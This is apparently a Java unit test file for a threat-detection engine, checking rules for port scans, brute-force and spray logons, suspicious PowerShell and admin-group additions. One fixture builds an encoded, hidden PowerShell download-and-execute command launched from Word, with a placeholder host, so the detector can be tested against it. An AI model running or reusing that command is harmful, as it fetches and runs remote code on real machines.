package com.threatlens.detection;

import com.threatlens.detection.rules.*;
import com.threatlens.domain.EventType;
import com.threatlens.domain.SecurityEvent;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.*;

import static com.threatlens.detection.TestEvents.*;
import static org.assertj.core.api.Assertions.assertThat;

class RulesTest {

    private static List<SecurityEvent> sorted(List<SecurityEvent> l) {
        l.sort(Comparator.comparing(SecurityEvent::getEventTime));
        return l;
    }

    @Test
    void portScan_firesOnManyDistinctPorts_withMitreT1046() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int p = 1; p <= 100; p++) evs.add(flow(p / 2, "172.16.0.1", "192.168.10.50", p));
        List<Detection> d = new PortScanRule().evaluate(sorted(evs));
        assertThat(d).hasSize(1);
        assertThat(d.getFirst().technique().id()).isEqualTo("T1046");
        assertThat(d.getFirst().evidence().get("distinctPorts")).isEqualTo(100);
    }

    @Test
    void portScan_ignoresNormalBrowsing() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 300; i++) evs.add(flow(i, "192.168.10.5", "8.8.8.8", i % 2 == 0 ? 443 : 80));
        assertThat(new PortScanRule().evaluate(sorted(evs))).isEmpty();
    }

    @Test
    void bruteForce_fiveFailuresInTwoMinutesFires_fourDoesNot() {
        LogonBruteForceRule rule = new LogonBruteForceRule();
        List<SecurityEvent> four = new ArrayList<>();
        for (int i = 0; i < 4; i++) four.add(logon(i * 10, false, "10.0.0.9", "bob", "WKS1"));
        assertThat(rule.evaluate(sorted(four))).isEmpty();

        List<SecurityEvent> five = new ArrayList<>(four);
        five.add(logon(45, false, "10.0.0.9", "bob", "WKS1"));
        List<Detection> d = rule.evaluate(sorted(five));
        assertThat(d).hasSize(1);
        assertThat(d.getFirst().technique().id()).isEqualTo("T1110.001");
    }

    @Test
    void bruteForce_slowFailuresOverTwoMinutesDoNotFire() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 5; i++) evs.add(logon(i * 40, false, "10.0.0.9", "bob", "WKS1")); // 160s span
        assertThat(new LogonBruteForceRule().evaluate(sorted(evs))).isEmpty();
    }

    @Test
    void privilegedTargetAddsRiskFactor() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 6; i++) evs.add(logon(i, false, "10.0.0.9", "Administrator", "DC01"));
        Detection d = new LogonBruteForceRule().evaluate(sorted(evs)).getFirst();
        assertThat(d.ruleFactors()).containsEntry("privilegedAccount", 10);
    }

    @Test
    void passwordSpray_manyAccountsFewAttemptsEach() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 12; i++) evs.add(logon(i * 50, false, "10.0.5.77", "user" + i, "DC01"));
        List<Detection> d = new PasswordSprayRule().evaluate(sorted(evs));
        assertThat(d).hasSize(1);
        assertThat(d.getFirst().technique().id()).isEqualTo("T1110.003");
        // slow enough that the per-IP brute force rule stays quiet: spraying evades it
        assertThat(new LogonBruteForceRule().evaluate(sorted(evs))).isEmpty();
    }

    @Test
    void successAfterBruteForce_correlatesFailuresAndSuccess() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 8; i++) evs.add(logon(i * 5, false, "10.0.5.66", "administrator", "FIN-SRV01"));
        evs.add(logon(60, true, "10.0.5.66", "administrator", "FIN-SRV01"));
        evs.add(logon(70, true, "10.0.1.20", "alice", "WKS1")); // unrelated success
        List<Detection> d = new LogonAfterBruteForceRule().evaluate(sorted(evs));
        assertThat(d).hasSize(1);
        assertThat(d.getFirst().username()).isEqualTo("administrator");
        assertThat(d.getFirst().events()).hasSize(9);
    }

    @Test
    void successForDifferentAccountIsNotCorrelated() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 8; i++) evs.add(logon(i * 5, false, "10.0.5.66", "administrator", "FIN-SRV01"));
        evs.add(logon(60, true, "10.0.5.66", "svc_web", "FIN-SRV01"));
        assertThat(new LogonAfterBruteForceRule().evaluate(sorted(evs))).isEmpty();
    }

    @Test
    void encodedPowerShellFromWord_isDecodedAndScoredHigher() {
        String enc = Base64.getEncoder().encodeToString(
                "IEX (New-Object Net.WebClient).DownloadString('http://x/a')".getBytes(StandardCharsets.UTF_16LE));
        SecurityEvent e = at(0, EventType.PROCESS_CREATE);
        e.setHost("WKS-042");
        e.setUsername("jdoe");
        e.setProcess("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        e.setParentProcess("C:\\Program Files\\Microsoft Office\\WINWORD.EXE");
        e.setCommandLine("powershell.exe -nop -w hidden -enc " + enc);
        Detection d = new SuspiciousPowerShellRule().evaluate(List.of(e)).getFirst();
        assertThat(d.evidence().get("decodedCommand").toString()).contains("DownloadString");
        assertThat(d.ruleFactors()).containsEntry("officeParent", 20);
    }

    @Test
    void plainPowerShellIsIgnored() {
        SecurityEvent e = at(0, EventType.PROCESS_CREATE);
        e.setProcess("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        e.setCommandLine("powershell.exe Get-ChildItem C:\\Users");
        assertThat(new SuspiciousPowerShellRule().evaluate(List.of(e))).isEmpty();
    }

    @Test
    void freshAccountAddedToAdmins_getsFreshAccountFactor() {
        SecurityEvent created = at(0, EventType.ACCOUNT_CREATED);
        created.setUsername("svc_backup2");
        created.setHost("WKS-042");
        SecurityEvent added = at(120, EventType.GROUP_MEMBER_ADDED);
        added.setUsername("svc_backup2");
        added.setHost("WKS-042");
        added.getAttributes().putAll(Map.of("GroupName", "Administrators", "PrivilegedGroup", true, "SubjectUserName", "jdoe"));
        Detection d = new PrivilegedGroupAddRule().evaluate(List.of(created, added)).getFirst();
        assertThat(d.ruleFactors()).containsEntry("freshAccount", 20);
        assertThat(d.technique().id()).isEqualTo("T1098");
    }

    @Test
    void fingerprintIsStableSoRerunsAreIdempotent() {
        List<SecurityEvent> evs = new ArrayList<>();
        for (int i = 0; i < 6; i++) evs.add(logon(i, false, "10.0.0.9", "bob", "WKS1"));
        String a = new LogonBruteForceRule().evaluate(sorted(evs)).getFirst().fingerprint();
        String b = new LogonBruteForceRule().evaluate(sorted(evs)).getFirst().fingerprint();
        assertThat(a).isEqualTo(b).startsWith("WIN-001|10.0.0.9|");
    }
}
